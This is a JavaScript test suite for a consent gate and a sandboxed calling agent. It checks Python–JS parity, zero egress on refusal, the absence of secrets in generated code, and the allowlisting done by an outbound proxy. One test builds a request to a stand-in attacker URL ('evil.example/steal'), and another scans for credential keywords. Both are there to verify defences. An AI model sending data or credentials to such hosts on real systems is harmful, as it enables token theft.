/**
 * The other half of the two-implementation problem.
 *
 * `api/test_consent_vectors.py` proves `shared/consentVectors.json`
 * still describes the real Python. This proves the JavaScript port
 * agrees with the same file. Between them there is no configuration in
 * which the two gates quietly disagree about whether somebody's phone
 * rings.
 *
 * The sandbox tests below are the actual point of #117: a refusal must
 * be the ABSENCE OF A CAPABILITY, not a branch some future caller can
 * forget to take.
 */

import { describe, it, expect } from 'vitest';
import { readFileSync } from 'node:fs';
import { mayContact, briefFor, NEEDS } from './src/consent.mjs';
import {
	sandboxFor, agentSource, isolateId, outboundHandler,
	EGRESS_BY_CHANNEL, LIMITS,
} from './src/agentSandbox.mjs';

const VECTORS = JSON.parse(readFileSync(new URL('../../shared/consentVectors.json', import.meta.url)));

/** The fixture is written for Python's keyword arguments. */
const situationOf = (args) => ({
	channel: args.channel,
	purpose: args.purpose,
	nowIso: args.now_iso,
	localHour: args.local_hour,
	contactsToday: args.contacts_today,
	recipientSaidStop: args.recipient_said_stop,
	revoked: args.revoked,
});

describe('the JS gate agrees with the Python gate', () => {
	for (const c of VECTORS.cases) {
		it(c.name, async () => {
			const [allowed, why] = await mayContact(c.consent, situationOf(c.args));
			expect({ allowed, why }).toEqual(c.expect);
		});
	}

	it('the fixture actually covers both answers', () => {
		// Guards the guard. A gate that always refused would satisfy every
		// refusal vector, and a fixture of only refusals would let it.
		const yes = VECTORS.cases.filter((c) => c.expect.allowed).length;
		expect(yes).toBeGreaterThanOrEqual(3);
		expect(VECTORS.cases.length - yes).toBeGreaterThanOrEqual(8);
	});
});

describe('the brief is words, not flags', () => {
	const withNeeds = (needs) => ({ record: { kind: 'consent', needs } });

	it('renders each need as an instruction', () => {
		expect(briefFor(withNeeds(['reintroduce']))).toContain(NEEDS.reintroduce);
	});

	it('is empty when there is nothing to say', () => {
		expect(briefFor(withNeeds([]))).toBe('');
		expect(briefFor({})).toBe('');
	});

	it('ignores a need nobody defined rather than inventing one', () => {
		expect(briefFor(withNeeds(['telepathy']))).toBe('');
	});
});

// ── the sandbox ──────────────────────────────────────────────────────

const consentFor = (over = {}) => ({
	record: {
		kind: 'consent', id: 'consent-abc', creator: 'gk',
		channels: ['voice', 'sms'], purposes: ['companionship'],
		needs: ['reintroduce', 'slow-speech'],
		waking_hours: [9, 20], max_contacts_per_day: 2,
		expires_at: '2027-01-01T00:00:00Z', recipient_ref: 'ref-1',
		...over,
	},
	signature: 'sig', public_key: 'gk', digest: 'd',
});

const ok = {
	channel: 'voice', purpose: 'companionship',
	nowIso: '2026-08-06T10:00:00Z', localHour: 10,
	contactsToday: 0, callerName: 'Alex',
};

describe('a refusal is the absence of a capability', () => {
	it('a permitted attempt gets exactly the hosts its channel needs', async () => {
		const s = await sandboxFor(consentFor(), ok);
		expect(s.allowed).toBe(true);
		expect(s.spec.globalOutbound).toEqual({ allow: EGRESS_BY_CHANNEL.voice });
	});

	it('an agent placing a call cannot reach the SMS host, though the consent permits SMS', async () => {
		// The allowlist is the intersection of what is permitted and what
		// THIS attempt is for — not the union of every permitted channel.
		const s = await sandboxFor(consentFor(), ok);
		expect(s.spec.globalOutbound.allow).not.toContain('rest.nexmo.com');
	});

	for (const [name, situation] of [
		['out of hours', { ...ok, localHour: 3 }],
		['at the ceiling', { ...ok, contactsToday: 2 }],
		['recipient said stop', { ...ok, recipientSaidStop: true }],
		['guardian revoked', { ...ok, revoked: true }],
		['expired', { ...ok, nowIso: '2028-01-01T00:00:00Z' }],
		['channel not agreed', { ...ok, channel: 'email' }],
	]) {
		it(`${name}: the isolate cannot reach anything at all`, async () => {
			const s = await sandboxFor(consentFor(), situation);
			expect(s.allowed).toBe(false);
			// Not a flag the agent could ignore. There is no egress.
			expect(s.spec.globalOutbound).toBeNull();
			expect(s.hosts).toEqual([]);
		});
	}

	it('a refused sandbox is still runnable — running it just achieves nothing', async () => {
		// The property worth having: a caller who forgets to check
		// `allowed` does not accidentally place a call.
		const s = await sandboxFor(consentFor(), { ...ok, revoked: true });
		expect(s.spec.mainModule).toBe('agent.js');
		expect(s.spec.modules['agent.js']).toBeTruthy();
		expect(s.spec.globalOutbound).toBeNull();
	});

	it('an unwired channel gets no host rather than a guessed one', async () => {
		expect(EGRESS_BY_CHANNEL.email).toEqual([]);
		const s = await sandboxFor(consentFor({ channels: ['email'], purposes: ['companionship'] }),
			{ ...ok, channel: 'email' });
		expect(s.spec.globalOutbound).toBeNull();
	});
});

describe('the isolate is given a manner and never a secret', () => {
	it('bakes the access-needs brief into the code that runs', async () => {
		const s = await sandboxFor(consentFor(), ok);
		expect(s.spec.modules['agent.js']).toContain(NEEDS['slow-speech']);
		expect(s.spec.modules['agent.js']).toContain(NEEDS.reintroduce);
	});

	it('passes the caller name only when reintroduce was agreed', async () => {
		const withIt = await sandboxFor(consentFor(), ok);
		expect(withIt.spec.modules['agent.js']).toContain('Alex');

		const without = await sandboxFor(consentFor({ needs: [] }), ok);
		expect(without.spec.modules['agent.js']).not.toContain('Alex');
	});

	it('carries no token, no number and no recipient identity', async () => {
		const s = await sandboxFor(consentFor(), { ...ok, callerName: 'Alex' });
		const whole = JSON.stringify(s.spec);
		for (const secret of ['Bearer', 'VONAGE', 'api_key', 'private_key', 'ref-1', '4477']) {
			expect(whole, secret).not.toContain(secret);
		}
		expect(s.spec.env).toEqual({ CONSENT_ID: 'consent-abc', PURPOSE: 'companionship' });
	});

	it('survives a consent record containing quotes and newlines', async () => {
		// Generated source is string-built. An apostrophe in a need or a
		// name is a syntax error waiting to happen.
		const s = await sandboxFor(consentFor(), { ...ok, callerName: `Al"ex'\n\\` });
		expect(() => new Function(s.spec.modules['agent.js'].replace(/^export default/, 'return'))).not.toThrow();
	});

	it('caps what one run can burn', async () => {
		const s = await sandboxFor(consentFor(), ok);
		expect(s.spec.limits).toEqual(LIMITS);
		expect(s.spec.limits.cpuMs).toBeGreaterThan(0);
	});
});

describe('the isolate id', () => {
	it('keeps two consents off each other\'s warm isolate', () => {
		const a = isolateId(consentFor({ id: 'consent-a' }), 'voice');
		const b = isolateId(consentFor({ id: 'consent-b' }), 'voice');
		expect(a).not.toBe(b);
	});

	it('separates channels under the same consent', () => {
		const c = consentFor();
		expect(isolateId(c, 'voice')).not.toBe(isolateId(c, 'sms'));
	});
});

describe('the outbound proxy', () => {
	it('blocks a host that is not on the list', async () => {
		const out = outboundHandler(['api.nexmo.com'], { vonageToken: 'tok' });
		const res = await out.fetch(new Request('https://evil.example/steal'));
		expect(res.status).toBe(403);
	});

	it('does not attach the credential to a blocked request', async () => {
		// Order matters: refuse first, then attach. The other way round
		// puts a live token on a request to an arbitrary host.
		let sawAuth = null;
		const spy = globalThis.fetch;
		globalThis.fetch = async (r) => { sawAuth = r.headers.get('Authorization'); return new Response('{}'); };
		try {
			const out = outboundHandler(['api.nexmo.com'], { vonageToken: 'tok' });
			await out.fetch(new Request('https://evil.example/steal'));
			expect(sawAuth).toBeNull();   // never reached the wire at all
		} finally { globalThis.fetch = spy; }
	});

	it('strips an Authorization the isolate set for itself', async () => {
		let sent = null;
		const spy = globalThis.fetch;
		globalThis.fetch = async (r) => { sent = r.headers.get('Authorization'); return new Response('{}'); };
		try {
			const out = outboundHandler(['api.nexmo.com'], { vonageToken: 'real-token' });
			await out.fetch(new Request('https://api.nexmo.com/v1/calls', {
				method: 'POST', headers: { Authorization: 'Bearer forged-by-the-agent' },
			}));
			expect(sent).toBe('Bearer real-token');
		} finally { globalThis.fetch = spy; }
	});

	it('attaches the credential on an allowed host', async () => {
		let sent = null;
		const spy = globalThis.fetch;
		globalThis.fetch = async (r) => { sent = r.headers.get('Authorization'); return new Response('{}'); };
		try {
			const out = outboundHandler(['api.nexmo.com'], { vonageToken: 'tok' });
			await out.fetch(new Request('https://api.nexmo.com/v1/calls', { method: 'POST' }));
			expect(sent).toBe('Bearer tok');
		} finally { globalThis.fetch = spy; }
	});
});

describe('the generated source', () => {
	it('is valid JavaScript', () => {
		const src = agentSource({ brief: 'be kind', purpose: 'companionship', reintroduceAs: 'Alex' });
		expect(() => new Function(src.replace(/^export default/, 'return'))).not.toThrow();
	});
});
